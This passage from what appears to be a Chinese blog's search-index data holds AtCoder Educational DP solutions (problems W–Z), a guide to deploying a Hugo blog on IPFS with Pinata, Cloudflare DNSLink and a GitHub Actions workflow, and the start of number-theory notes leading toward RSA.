\\text{dp}[v]=f[v]\\cdot(\\frac{f[u]\\cdot g[u]}{f[v]+1}+1) $$ 发现由于我们自顶向下更新，$f[u],g[u]$ 已知，记录一下 $g[v]$ 然后直接更新 $\\text{dp}[v]$ 即可。总复杂度 $\\mathcal{O}(N)$。 这题另一个大坑是 $M$ 不一定是个质数，而且还不能保证和答案互质，就不能直接求逆元。处理方法就是，在第一次 dfs 的是时候记录前缀后缀积，转移的时候直接从里面查出来缺项积再做乘法来避免了除法取模。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:22:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["趣题记录"],"content":"W. Intervals 很漂亮的一道题。 令 $\\text{dp}[i]$ 为当 $s[i]=1$ 时 $1\\sim i$ 的答案，显然： $$ \\text{dp}[i]=\\max_{1\\le j\u003ci\\land\\forall p,i\\in [l_p, r_p], j\\notin[l_p,r_p]}\\{\\text{dp}[j]+\\sum{a_p}\\} $$ 容易发现这是个 $\\mathcal{O}(n^2)$ 的过程，肯定是过不去的。观察到转移方程类似于 Q，提示我们用线段树优化转移。 这个题的树上维护有点讲究，我们不考虑只维护 $\\text{dp}[j]$，反过来我们考虑维护 $\\text{dp}[j]+\\sum_{p}$ 全体。容易观察到，当我们进入了某一个线段之后，假设当前为 $1$，那我们对这个线段左端点之前的 $\\text{dp}[j]$ 都有贡献，我们直接把贡献加上去；而当我们离开这个线段之后，我们对前面所有左端点的贡献都没有了，所以要取消掉这个贡献。在这种情况下，$\\text{dp}[i]$ 的答案显然就是 $\\max_{j=1}^{i-1}\\{\\text{seg}[j]\\}$。 所以，我们直接在线段树上维护 $\\text{dp}[j]+\\sum_{p}$，每次我们进入一条线段时对 $1\\sim l_i-1$ 加上 $a_i$，而离开一条线段时对 $1\\sim l_i-1$ 加上 $-a_i$，把贡献取消掉。当一轮更新结束之后，直接查询 $1\\sim i$ 的值并插入到线段树的此位置即可。最后的答案就是全体最大值。 容易观察到每一条线段只会加一次删一次，所以总复杂度是 $\\mathcal{O}(N\\log N)$ 的。$N$ 有点大而且操作还是比较多的，所以常数比较大，跑的不是很快。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:23:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["趣题记录"],"content":"X. Tower 根据题意显然易得从上往下放更容易考虑。 Exchange Arguments 这道题用到的技巧叫做 Exchange Arguments，我不知道中文应该翻译成什么就保持原名了。 这个技巧通常用于贪心中来证明我们的贪心解就是最优解。而在 DP 中，我们通常使用它来贪心证明 DP 选择的步骤具有某种全序关系，进而利用这个全序关系进行 DP。 假定我们存在某一个贪心解 $G=\\{g_1, g_2,\\cdots,g_n\\}$，而最优解为 $O^*=\\{o_1, o_2,\\cdots,o_n\\}$。假设最终的解可以用一个序列 $S=s_1,s_2,\\cdots,s_i,\\cdots,s_j,\\cdots$ 来描述。我们现在选择某一对参数 $s_i$ 和 $s_j$ 来交换，产生一个新解 $O^*_1$，使得这个新解满足两个性质： $O^*_1$ 不比 $O^*$ 更差，或者说至少一样好。同样的，$O^*_1$ 也是一个最优解。 $O^*_1$ 比起 $O^*$ 更和 $G$ 相似。 那么同样的，我们可以进一步迭代 $O^*_1$ 得到 $O^*_2$。在有限步迭代之后，我们得到了 $O^*_n=G$。我们也就证明了 $G$ 也就是最优解。 用一些更感性的说法来说，始终考虑我们存在某一个解，我们来证明任意一对相邻的元素应该具有某一种序才能保证其中某一项在前时的答案更优。这个显然针对任意一对非相邻的都成立，因为我们证明的是一个全序，总可以在有限次交换内交换为相邻的一对，然后把这对元素排序后再有限次交换回原位置，所以结果始终成立。 那么我们根据题目讨论任意答案塔上的两个砖块 $i$ 和 $j$。假定我们交换他们俩，那么他们上面的重量不会变，设为 $w$，他们下面一块砖的总承重也不会变；同样的，给到这个塔的总价值贡献也不会减少。 那么，唯一影响这两块砖摆放顺序的就是以下两个结论： $i$ 放在 $j$ 上塔不会崩溃：$w+w_i\\le s_j$ $j$ 放在 $i$ 上塔一定会崩溃：$w+w_j\u003es_i$ 整理式子，容易得到：$s_j-w_i\\ge w\u003e s_i-w_j\\implies s_j+w_j\u003es_i+w_i$，也就是说，$s+w$ 越小的越应该放在上面。所以根据结论，我们按照 $s+w$ 的顺序排个序然后直接跑 0-1 背包即可，复杂度 $\\mathcal{O}(N\\cdot\\max\\{s\\})$。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:24:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["趣题记录"],"content":"Y. Grid 2 由于 $2\\le H,W\\le 10^5$，之前的 $O(HW)$ dp 显然不可能了；而 $1\\le N\\le3000$，显然提示我们应该做一个和 $N$ 有关的 dp。 首先的一个观察是我们总是从左上角去右下角，提示我们应该按点的左上角到右下角的顺序来 dp。考虑两个点 $A$ 和 $B$，其中 $A$ 在 $B$ 的左上角。设 $\\text{dp}[p]$ 为不经过点 $p$ 左上角所有点从起点到点 $p$ 的路径方案数，我们来考虑从左上角不经过任何点到 右下角的方案数。容斥一下，我们到右下角有四种走法： 不经过 $A,B$ 到右下角； 只经过 $A$ 到右下角； 只经过 $B$ 到右下角； 经过 $A, B$ 到右下角。 只经过 $B$ 到右下角很好想，只需要不经过 $A$ 到 $B$ 然后再从 $B$ 到右下角即可。只经过 $A$ 到右下角呢？这一部分会包含经过 $A, B$ 到右下角的方案数，这就提示我们，是否可以不计算第四部分，直接计算减掉第二部分即可？当然可以！ 所以，我们的 dp 过程很简单，首先计算出从左上角到 $A$ 不经过其他点的方案数，然后从左上角到 $B$ 的方案数减掉不经过左上角所有点经过 $A$ 到 $B$ 的方案数（这时我们就得到了不经过 $A$ 从左上角到 $B$ 的方案数），最后从左上角到右下角的方案减掉不经过左上角所有点经过 $A$ 到右下角的方案和不经过左上角所有点经过 $B$ 到右下角的方案数。左上角有多个点的情况就留作习题了 :)。 至于代码实现就简单了：我们先排好序然后从左上角的点开始迭代，如果点 $i$ 在点 $j$ 的左上角，我们就在从 $\\text{dp}[j]$ 减掉 从起点经过 $i$ 到 $j$ 的方案。显然，转移的方案数就是从左上角不经过其他点到 $i$ 的方案数乘上 $i$ 到 $j$ 的方案数。那么就有： $$ \\text{dp}[j]=\\binom{P_j.x+P_j.y}{P_j.x}-\\sum_{\\forall i, P_i.x\\le P_j.x, P_i.y\\le P_j.y}\\text{dp}[i]\\cdot\\binom{P_j.x+P_j.y-P_i.x-P_i.y}{P_j.x-P_i.x} $$ 提前把右下角这个点 $(H,W)$ 添加进去先排个序再一起 dp，答案就是 $\\text{dp}[N]$，复杂度为 $\\mathcal{O}(N\\log N+N^2)$。写出来其实挺短的。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:25:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["趣题记录"],"content":"Z. Frog 3 斜率优化或者李超树优化。又到了现学现卖的时间了啊。 先分析题目，类似于原题，我们很容易写出转移方程： $$ \\text{dp}[i] = \\min_{1\\le j\u003ci}\\{\\text{dp}[j]+(h_i-h_j)^2+C\\} $$ 拆一下式子，我们进一步写一下： $$ \\text{dp}[i] = h_{i}^2+C+\\min_{1\\le j\u003ci}\\{\\text{dp}[j]+h_j^2-2h_ih_j\\} $$ 我们可以发现，对于某个 $j$，$\\text{dp}[j]$ 和 $h_j$ 都是确定的，那么就变成了，对于某个确定的 $i$，我们需要找到前 $j$ 个值中最小的值。我们观察这个式子，重写一下：$v=-2h_ih_j+\\text{dp}[j]+h_j^2$，可以发现，$v$ 是一条直线，仅和 $h_i$ 有关。所以，我们就变成了在前 $j$ 条直线中，对于确定的 $h_i$，找到这样的一条直线，使得 $v$ 最小。我们现在来看怎么处理这个问题。 斜率优化 斜率优化英文名叫 Convex Hull Trick (CHT)。发现有凸包没有？这个优化的核心就在理解这个凸包上。 实际上，这个过程我们需要的不是一个凸包，而是凸壳。让我们先来观察一下这个图： 图 1 答案会在什么位置？显而易见的是，都在“最上面”的直线上。什么叫最上面呢？对于一个确定的 $x$，一定在所有交点的最上面。现在，我们来观察一下这几条直线构成的凸壳： 图 2 发现什么没有？所有可能的答案都在这个凸壳的边界上！这就是斜率优化的本质：维护这样的一个凸壳的集合，保证我们的查询能够落在的任何一条直线都在这个凸壳上。 显而易见的是，如果要维护这个凸壳，我们自然需要一个比较好的数据结构。我们现在来考虑这个数据结构的实现（我们假定插入直线的顺序按斜率有序插入，同时也假定查询的点按顺序是有序的）： 询问：我们从最左侧的直线开始比较，假如 $y_0 \u003c y_1$，说明答案不在这条线上，删除，然后重复上述过程，直到找到答案，直接返回。 插入：考虑最右侧的直线，如果我们插入的这条直线和最右侧直线的交点在最右侧直线和它左侧直线交点的左侧，那么就考虑把这条直线删除。 观察到什么没有？由于上面的所有操作都只涉及一端，我们完全可以使用一个双端队列来维护它！ 正确性也是显然的： 询问：由于查询会一直往左侧靠近，答案不会再出现在右侧，所以这个过程正确。 插入：由于查询是往左侧靠近的，答案不会再落在右侧，虽然原始直线交点右侧比插入的直线更高，但是答案不会出现在那一侧；而对于交点左侧，插入的直线比原始直线更高，答案会落在新直线上。所以原始直线可以被删除，则这个过程也正确。 那么我们的 CHT 就写完了！ 我的实现可以参考这里。由于每条直线只会至多被插入和删除一次，则总复杂度就是 $\\mathcal{O}(n)$ 的。 而实际上全动态的 CHT 写起来比较麻烦，不如李超树好写，所以这个情况最好写的还是在斜率有序的情况下。 李超树 为什么叫李超树呢？因为是李超的 线段树 ppt 里面提到的建树方法（ 李超树就是一棵简单的线段树而已，区别是维护的东西不同，李超树维护的东西叫做“优势线段”。什么是优势线段呢？某个区间内从上往下看长度最长的线段。例如，下图中的红色线段就是当前区间中最长的优势线段。 图 3 考虑上面的斜率优化的讨论，我们可以发现，这样维护出来的线段集合就正好在答案区间内构成了一个凸壳！所以显而易见，这是正确的。 接下来我们考虑怎么维护这些线段。首先是添加过程： 假设当前区间没有线段：直接添加 假设新线段比旧线段有优势：新线段替换旧线段，然后带着旧线段继续更新 假如有交点：讨论交点位置，并把当前线段带到另一侧更新 观察上面的图，发现假如我们讨论当前区间，并不一定能获得最大值，因为可能最大值在绿色线段上，这样的话我们是得不到答案的，所以查询的时候不能直接返回当前区间的值，我们需要一路走到叶子节点，这里面的最大值才是答案。 容易观察得到，插入就是简单的线段树插入，而查询需要一次完整的走树，所以总复杂度是 $\\mathcal{O}(n\\log^2 n)$。 我的实现可以参考这里。 回到本题，实际上我们只需要维护直线 $-2h_ih_j+\\text{dp}[j]+h_j^2$ 的值即可。具体这么做： 首先把第一条直线 $-2h_1x+h_1^2$ 插入进去。 依序更新每一条线段，首先查询出当前的最小值 $m$，则 $\\text{dp}[j]=m+h_j^2+C$ 之后把新的线段 $-2h_jx+\\text{dp}[j]+h_j^2$ 插入进去。 答案就是 $\\text{dp}[N]$。根据选择的结构不同，复杂度也不一样。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:26:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["博客记录"],"content":"在最近博客的例行维护（更换主题修复 post）过程中，我偶然读了这篇文章。之前就对 IPFS 有点兴趣，这次花了点时间去看了一下相关知识，发现最近的 IPFS 生态完善了许多，我就花了点时间迁移了整个工作流。这篇文章就是过程中的一些记录。 ","date":"2020-04-17","objectID":"/post/1b1fad8c/:0:0","tags":["博客记录","IPFS"],"title":"拥抱 IPFS","uri":"/post/1b1fad8c/"},{"categories":["博客记录"],"content":"什么是 IPFS IPFS是我认为自区块链诞生以来最具使用价值的区块链项目之一。IPFS 全名星际文件系统，是一种去中心化的文件存储系统。IPFS 使用区块链技术来计算文件哈希，并使用区块来存储文件。 IPFS 的底层技术类似于 BT，一个 node 既可以是文件的下载者也可以是上传者：当你询问某一个文件的 hash 的时候，IPFS 会在节点间传递询问，有这个文件的节点会相应并把文件发送给你；当你添加了一个文件你就把相关的哈希添加到了网上，当别人询问这个哈希的时候本地节点提出响应并传输文件。 当然，帮别人保存和上传文件对自己没有什么好处，所以 IPFS 提出了 FileCoin 来激励用户接入 IPFS。由于 FileCoin 公网这些还没上线，同时我个人本身一直不看好加密货币，就暂时不介绍了，感兴趣的同学可以看 IPFS 官方的介绍。 IPFS 的去中心化和区块链特性有诸多优势，比如区块链带来的天生文件永久保存和文件的一致性保证，而去中心化带来的极低的均摊存储成本和全球内容分发，也难怪有人认为 IPFS 是 Web3.0 时代的基础协议之一。 本博客已经部署在 IPFS 上：https://ipfs.lxdlam.com。 ","date":"2020-04-17","objectID":"/post/1b1fad8c/:1:0","tags":["博客记录","IPFS"],"title":"拥抱 IPFS","uri":"/post/1b1fad8c/"},{"categories":["博客记录"],"content":"IPFS 静态网站的坑 那 IPFS 怎么部署一个静态网站呢？ 从原理上来说，静态网站就是一个静态文件的集合，那我们直接安装 IPFS 然后 ipfs add public 就可以了？没这么简单，我们还有两个问题需要解决。 ","date":"2020-04-17","objectID":"/post/1b1fad8c/:2:0","tags":["博客记录","IPFS"],"title":"拥抱 IPFS","uri":"/post/1b1fad8c/"},{"categories":["博客记录"],"content":"Pin 由于 IPFS 是分布式的文件系统，并不是所有人都需要保存所有文件，于是 IPFS 对每个节点保有的文件是允许进行限制和清理的。这意味着，你的文件虽然发到了 IPFS 上，但是因为没人有这个文件的副本（就好像 BT 中没人做种），别人也访问不到。 当然，为了解决这个问题，IPFS 提供了一个操作叫做 Pin，把你的文件“钉”在节点上。这就万事大吉了吗？没有。当某个节点钉住了你的文件之后，这个节点必须可一直访问才能保证你的文件持续在线。这也就是说，我们必须有个一直在线的节点来响应用户请求才能保证你的网站一直在线，不然用户一个请求过来发现文件不存在，网站就下线了。 为了使你的文件持续在线，现在有很多的 Pinning 服务来在他们的服务器上 Pin 你的文件（就像 BT 的 Seedbox）。常见的 Pinning 服务有下面几个： https://infura.io/ https://www.eternum.io/ https://pinata.cloud/ 我使用的是最后一个 Pinata，只要你 Pin 在他们服务上的文件总大小小于 1G 就可以免费使用，管理 Pin 的内容也比较方便。 当然，还可以选择用一个树莓派来做 Pinning，但是这个就要求网络环境好一点，不然博客访问速度就会很难受 ;)。 ","date":"2020-04-17","objectID":"/post/1b1fad8c/:2:1","tags":["博客记录","IPFS"],"title":"拥抱 IPFS","uri":"/post/1b1fad8c/"},{"categories":["博客记录"],"content":"Gateway 如果你现在尝试访问一个 IPFS 的文件，你大概率是访问不了的，因为你的设备上并没有 IPFS 环境，设备不知道这个协议怎么处理。解决这个问题的就是 Gateway。 Gateway 可以看作一个 IPFS 代理，在这个代理后面有一个 IPFS 环境。当我们使用文件哈希访问 Gateway 的时候，Gateway 会帮我们请求 IPFS 节点，并把这个文件通过 HTTP/HTTPS 的方式传回来。IPFS 官方同时提供了一个叫做 DNSLink 的解决方案，通过 CNAME 到一个 Gateway 并给你的域名添加一个 dnslink=/ipfs/\u003chash\u003e 的 TXT 记录，就能实现自定义域名跳转 Gateway 访问 IPFS 文件。我们自定义博客域名的方案也就搞定了。 常用的 Gateway 很多，比如上面我提到的 Pin 服务基本都提供了自己的 Gateway。我使用的是 Cloudflare 的，不仅免费还能得益于 Cloudflare 的全球 CDN 加速（虽然好像也没啥用）。 ","date":"2020-04-17","objectID":"/post/1b1fad8c/:2:2","tags":["博客记录","IPFS"],"title":"拥抱 IPFS","uri":"/post/1b1fad8c/"},{"categories":["博客记录"],"content":"迁移到 IPFS 迁移到 IPFS 还是挺简单的，主要经历了下面的步骤： ","date":"2020-04-17","objectID":"/post/1b1fad8c/:3:0","tags":["博客记录","IPFS"],"title":"拥抱 IPFS","uri":"/post/1b1fad8c/"},{"categories":["博客记录"],"content":"相关服务注册 先注册一下 Pinata 和 Cloudflare。因为种种原因，我这次也顺便把 DNS 从阿里云云解析前移到了 Cloudflare，所以我的 DNS 记录也就在 Cloudflare 了。 注册完 Pinata 之后应该就能看到自己的 API KEY 和 SECRET API KEY 了，先复制一份备用。 Cloudflare 添加两个记录： 一个博客域名到 www.cloudflare-ipfs.com 的 CNAME 的记录。比如我的就是 ipfs.lxdlam.com。 一个 _dnslink.\u003cdomain\u003e 的 TXT 记录，可暂时不填。比如我的就是 _dnslink.ipfs.lxdlam.com。 然后来到个人资料下面的 API 令牌页面，生成一个 API 令牌，给到两个权限： 区域 -\u003e DNS -\u003e 编辑 区域 -\u003e 区域 -\u003e 读取 区域资源处需要包含所有区域。然后记录下这个 API Token 备用。 ","date":"2020-04-17","objectID":"/post/1b1fad8c/:3:1","tags":["博客记录","IPFS"],"title":"拥抱 IPFS","uri":"/post/1b1fad8c/"},{"categories":["博客记录"],"content":"工具安装 我们的部署将使用 ipfs-deploy，这是一个自动把静态网站上传到 Pinning 服务然后修改 DNSLink 记录来保持域名指向正确的工具。我们先装到本地验证一下整个工作流对不对。 yarn global add ipfs-deploy 然后应该就可以用 ipd 或者 ipfs-deploy 来访问了。 如果你想尝试一下把站点发布到本地的 IPFS 节点的话，安装 IPFS 可以参考官网教程。 ","date":"2020-04-17","objectID":"/post/1b1fad8c/:3:2","tags":["博客记录","IPFS"],"title":"拥抱 IPFS","uri":"/post/1b1fad8c/"},{"categories":["博客记录"],"content":"调整博客配置和测试 由于两边配置略有区别的原因，我复制了一份 config.toml 然后命名为 config.ipfs.toml。 配置修改有两个要点： 由于 IPFS Gateway 会 CNAME 到一个新的域名上，使用绝对路径就会产生问题，在新的配置文件中添加 relativeURLs = true 来确保你使用的是相对路径。 调整一些和域名相关的配置，将其全部指向新的域名。 接下来尝试发布。先把相关的 key 配置到环境变量里： export IPFS_DEPLOY_PINATA__API_KEY=\u003cPinata 的 API KEY\u003e export IPFS_DEPLOY_PINATA__SECRET_API_KEY=\u003cPinata 的 SECRET API KEY\u003e export IPFS_DEPLOY_CLOUDFLARE__API_TOKEN=\u003cCloudflare 的 API TOKEN\u003e export IPFS_DEPLOY_CLOUDFLARE__ZONE=\u003cCloudflare 的域名区域\u003e export IPFS_DEPLOY_CLOUDFLARE__RECORD=\u003cCloudflare 上的 dnslink TXT 记录地址\u003e 然后生成并发布站点： hugo --gc --minify --cleanDestinationDir --config=config.ipfs.toml ipd -p pinata -d cloudflare 然后尝试访问你的新博客地址，如果一切正常的话就没问题啦！ ","date":"2020-04-17","objectID":"/post/1b1fad8c/:3:3","tags":["博客记录","IPFS"],"title":"拥抱 IPFS","uri":"/post/1b1fad8c/"},{"categories":["博客记录"],"content":"配置 CI 由于 CircleCI 访问起来实在是太慢了，加上 Github Actions 最近特别好用，我这次直接把博客的 CI 迁移到了 Actions。 下面是我的 Actions 配置文件，由于 IPFS 目前还在发展，我主要还是使用 Github Pages 来托管博客，所以持续集成的时候分开编译并部署到不同地方。如果你只想用 IPFS 的话，只用看 IPFS job 就行。 name: Blog Deploy on: [push] jobs: pages: name: Build and deploy to github pages runs-on: ubuntu-latest steps: - name: Checkout blog sources uses: actions/checkout@v2 with: submodules: true fetch-depth: 0 - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: hugo: '0.69.0' extended: true - name: Build site run: hugo --gc --minify --cleanDestinationDir --config=config.toml - name: Deploy to github pages run: | cd ./public git init git config user.name \"\u003cgithub user name\u003e\" git config user.email \"\u003cgithub user email\u003e\" git add . git commit -m \"Blog builds $GITHUB_RUN_ID using Github Actions\" git push --quiet --force \"https://${PAGES_DEPLOY_TOKEN}@${GITHUB_REPO_URL}\" master:master env: PAGES_DEPLOY_TOKEN: ${{ secrets.PAGES_DEPLOY_TOKEN }} GITHUB_REPO_URL: \u003cYour github pages repository\u003e ipfs: name: Build and deploy to ipfs runs-on: ubuntu-latest steps: - name: Checkout blog sources uses: actions/checkout@v2 with: submodules: true fetch-depth: 0 - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: hugo: '0.69.0' extended: true - name: Setup Node uses: actions/setup-node@v1 with: node-version: '13.x' - name: Build site run: hugo --gc --minify --cleanDestinationDir --config=config.ipfs.toml - name: Deploy to ipfs run: npx ipfs-deploy -p pinata -d cloudflare -C -O env: IPFS_DEPLOY_PINATA__API_KEY: ${{ secrets.PINATA_API_KEY }} IPFS_DEPLOY_PINATA__SECRET_API_KEY: ${{ secrets.PINATA_SECRET_API_KEY }} IPFS_DEPLOY_CLOUDFLARE__API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }} IPFS_DEPLOY_CLOUDFLARE__ZONE: \u003cYour cloudflare domain zone\u003e IPFS_DEPLOY_CLOUDFLARE__RECORD: \u003cYour dnslink record\u003e ${{ secrets.XXX }} 在仓库的 Options-\u003eSecrets 处添加。不要在你的仓库明文放置这些 Token！ 把这个文件放到 .github/workflows/ci.yml 然后 push 到 Github 上就可以等待 CI 自动部署你的博客啦。 ","date":"2020-04-17","objectID":"/post/1b1fad8c/:3:4","tags":["博客记录","IPFS"],"title":"拥抱 IPFS","uri":"/post/1b1fad8c/"},{"categories":["学习笔记"],"content":"这篇文章是有个朋友要选一门数学素养课，涉及到的内容其实并不复杂，就心血来潮的写了这篇文章梳理一下从小学数学到理解 RSA 需要的基础知识。阅读这篇你只需要有基础的阅读能力即可。 这篇文章只是一篇简单的 Walkthrough，如果对其中的某个定理想有更深入的研究，请复制到搜索引擎，网上会有更详细和严谨的资料。同时感谢龙二的审稿。 ","date":"2020-04-14","objectID":"/post/42be77f6/:0:0","tags":["数学","学习笔记"],"title":"From gcd to RSA","uri":"/post/42be77f6/"},{"categories":["学习笔记"],"content":"数学运算 ","date":"2020-04-14","objectID":"/post/42be77f6/:1:0","tags":["数学","学习笔记"],"title":"From gcd to RSA","uri":"/post/42be77f6/"},{"categories":["学习笔记"],"content":"基本运算 为了方便叙述，我们定义基本运算为下面三种： 加法运算 $+$； 减法运算 $-$； 乘法运算 $\\times$ 或者 $\\cdot$。 上述三种运算均满足交换律（$a+b=b+a$）和结合律（$(a+b)+c=a+(b+c)$）。乘法运算对于加减法满足分配律，即 $(a\\pm b)\\times c = a\\times c\\pm b\\times c$。 ","date":"2020-04-14","objectID":"/post/42be77f6/:1:1","tags":["数学","学习笔记"],"title":"From gcd to RSA","uri":"/post/42be77f6/"},{"categories":["学习笔记"],"content":"取余与同余运算 取余运算：令 $a=kb+r$，其中 $k$ 最大，则 $a$ 模 $b$ 的余数为 $r$，记作 $a{\\ \\text{mod}\\ } b = r$。 同余运算：如果 $a{\\ \\text{mod}\\ } r=b{\\ \\text{mod}\\ } r$，则称 $a$ 和 $b$ 模 $r$ 同余，记作 ${{a}\\equiv {b}\\pmod {r}}$。 整除运算：如果 $a{\\ \\text{mod}\\ } b=0$，则称 $b$ 整除 $a$，记作 $b|a$。 模 $n$ 同余的所有数构成的等价类叫做同余类。假定余数为 $a$，则同余类可记作 $[a]=\\{\\cdots,a-2n,a-n,a,a+n,a+2n,\\cdots\\}$。如 $3$ 的同余类有 $[0], [1], [2]$ 三个。 取余和同余保持基本运算（将 $a{\\ \\text{mod}\\ } b = r$ 看作 ${{a}\\equiv {r}\\pmod {b}}$)，也就是说： $$ \\left. \\begin{matrix} {{a}\\equiv {b}\\pmod {m}} \\\\{{c}\\equiv {d}\\pmod {m}} \\end{matrix} \\right\\} \\Rightarrow \\left\\{ \\begin{matrix} {{a\\pm c}\\equiv {b\\pm d}\\pmod {m}} \\\\{{ac}\\equiv {bd}\\pmod {m}} \\end{matrix} \\right. $$ ","date":"2020-04-14","objectID":"/post/42be77f6/:1:2","tags":["数学","学习笔记"],"title":"From gcd to RSA","uri":"/post/42be77f6/"},{"categories":["学习笔记"],"content":"最大公约数 ","date":"2020-04-14","objectID":"/post/42be77f6/:2:0","tags":["数学","学习笔记"],"title":"From gcd to RSA","uri":"/post/42be77f6/"},{"categories":["学习笔记"],"content":"约数与 gcd 运算 约数：能整除 $n$ 的正整数为 $n$ 的约数，所有这样的约数构成约数集合 $D_n=\\{d|n, d\\in\\mathbb{N}^+\\}$。 最大公约数：两个数公共的最大约数就叫做两个数的最大公约数(Greatest Common Divisor)，记作 $\\gcd(a, b)$。例如，$\\gcd(15,27)=3$。 在日常计算过程中，我们通常使用短除法来手动计算两个数的最大公约数。 ","date":"2020-04-14","objectID":"/post/42be77f6/:2:1","tags":["数学","学习笔记"],"title":"From gcd to RSA","uri":"/post/42be77f6/"},{"categories":["学习笔记"],"content":"辗转相除法 算法描述 $\\forall a,b\\in \\mathbb{Z}$，不失一般性，设 $a\u003eb$，则 $\\gcd(a, b) = \\gcd(b, a{\\ \\text{mod}\\ } b)$，不断迭代至其中较小的一项等于 $0$ 为止，此时的非 $0$ 项就是答案。 如果 $a{\\ \\text{mod}\\ } b = r$，也可写作 $\\gcd(a,b)=\\gcd(b,r)$。 正确性证明 令 $a=kb+r$，我们需要证明 $\\gcd(a,b)=\\gcd(b,r)$。 从 $\\gcd(a,b)$ 出发，我们有： $$ \\begin{aligned} \u0026\\gcd(a,b)|a \\land \\gcd(a,b)|b \\\\\\mathllap{\\implies} \u0026 \\gcd(a,b) | (a-kb) \\\\\\mathllap{\\implies} \u0026 \\gcd(a,b) | r \\\\\\mathllap{\\implies} \u0026 \\gcd(a,b)\\le\\gcd(b,r) \\end{aligned} $$ 关于 $3\\to4$ 的提示：考虑任意因子 $q|b, q|r$，易得 $q\\le\\gcd(b,r)$。第三步我们证明了 $\\gcd(a,b)|r$，而我们自然有 $\\gcd(a,b)|b$，则 $\\gcd(a,b)\\le\\gcd(b,r)$，即为第四步。 从 $\\gcd(b,r)$ 出发，我们有： $$ \\begin{aligned} \u0026\\gcd(b,r)|b \\land \\gcd(b,r)|r \\\\\\mathllap{\\implies} \u0026 \\gcd(b,r) | (kb+r) \\\\\\mathllap{\\implies} \u0026 \\gcd(b,r) | a \\\\\\mathllap{\\implies} \u0026 \\gcd(b,r)\\le\\gcd(a,b) \\end{aligned} $$ 综合两式立即可得 $\\gcd(a,b)=\\gcd(b,r)$。 而易知 $|r|\u003c|b|$，我们总可在有限步后得到 $b{\\ \\text{mod}\\ } r=0$，此时算法退出，我们得到的 $r$ 就是答案，得证。◼ ","date":"2020-04-14","objectID":"/post/42be77f6/:2:2","tags":["数学","学习笔记"],"title":"From gcd to RSA","uri":"/post/42be77f6/"},{"categories":["学习笔记"],"content":"裴蜀定理 定理 考虑 $\\forall a,b\\in\\mathbb{Z}$，其中 $a, b$ 不同时为 $0$。那么： $$ \\exists x,y\\in\\mathbb{Z}, ax+by=\\gcd(a,b) $$ 这样的数对 $(x, y)$ 称为裴蜀数，裴蜀数总有无穷多对。 裴蜀定理的证明与本文相关性不大，感兴趣的参考 ProofWiki 上的证明。 ","date":"2020-04-14","objectID":"/post/42be77f6/:2:3","tags":["数学","学习笔记"],"title":"From gcd to RSA","uri":"/post/42be77f6/"},{"categories":["学习笔记"],"content":"质数与互质 质数：也叫素数。质数指大于 $1$ 且只能被自己和 $1$ 整除的自然数，常见的质数为 $2$, $3$, $5$, $7$ 和 $11$。不是质数的自然数被称为合数。 互质：两个数 $a,b$ 互质即 $\\gcd(a,b)=1$。 ","date":"2020-04-14","objectID":"/post/42be77f6/:2:4","tags":["数学","学习笔记"],"title":"From gcd to RSA","uri":"/post/42be77f6/"},{"categories":["学习笔记"],"content":"同余除法第一原理 定理 考虑 $a,b,c,n\\in\\mathbb{Z}$，如果 $c$ 和 $n$ 互质，那么： $$ {{ca}\\equiv {cb}\\pmod {n}}\\implies{{a}\\equiv {b}\\pmod {n}} $$ 证明较为简单，留作习题。（提示：考虑 $ca=xn+r, cb=yn+r$，然后讨论 $n$ 整除性即可。） ","date":"2020-04-14","objectID":"/post/42be77f6/:2:5","tags":["数学","学习笔记"],"title":"From gcd to RSA","uri":"/post/42be77f6/"},{"categories":["学习笔记"],"content":"代数系统、群、环 ","date":"2020-04-14","objectID":"/post/42be77f6/:3:0","tags":["数学","学习笔记"],"title":"From gcd to RSA","uri":"/post/42be77f6/"},{"categories":["学习笔记"],"content":"代数系统 考虑有一个元素集合 $A$（如自然数集合），我们定义某一种运算（通常为二元运算），如果任意在 $A$ 中的元素经过这种运算之后的结果仍然在 $A$ 内，我们就称这个集合 $A$ 关于此运算封闭。 由一个元素集合 $A$ 和一系列在 $A$ 上封闭的运算组成的系统就叫做代数系统（也叫做代数结构）。 示例 一个简单的例子为实数和实数四则运算，它们构成了一个代数系统。 ","date":"2020-04-14","objectID":"/post/42be77f6/:3:1","tags":["数学","学习笔记"],"title":"From gcd to RSA","uri":"/post/42be77f6/"},{"categories":["学习笔记"],"content":"半群和幺半群 考虑代数系统 $(S,\\times)$，如果满足： 结合律：$\\forall a,b,c\\in S, (a\\times b)\\times c=a\\times(b\\times c)$。 那么我们称 $(S, \\times)$ 是一个半群。 考虑半群 $(M, \\times)$，如果满足： 存在单位元：$\\exists e\\in M$ 使得 $\\forall a\\in M, a\\times e=e\\times a=a$。 那么我们称 $(M,\\times)$ 是一个幺半群。 示例 一个常见的半群为整数加法半群，其中 $S=\\mathbb{Z}, \\times=+$。由于 $a+0=0+a=a$，则单位元 $0$，这个半群同样为幺半群。 ","date":"2020-04-14","objectID":"/post/42be77f6/:3:2","tags":["数学","学习笔记"],"title":"From gcd to RSA","uri":"/post/42be77f6/"},{"categories":["学习笔记"],"content":"群和阿贝尔群 考虑幺半群 $(G, \\times)$，如果满足： 存在逆元：$\\forall a\\in G$ 总满足 $\\exists x\\in G, a\\times x=x\\times a=e$，通常也记 $x=a^{-1}$。 那么我们称 $(G,\\times)$ 是一个群。 考虑群 $(A, \\times)$，如果满足： 交换律：$\\forall a,b\\in A, a\\times b=b\\times a$。 那么我们称 $(A, \\times)$ 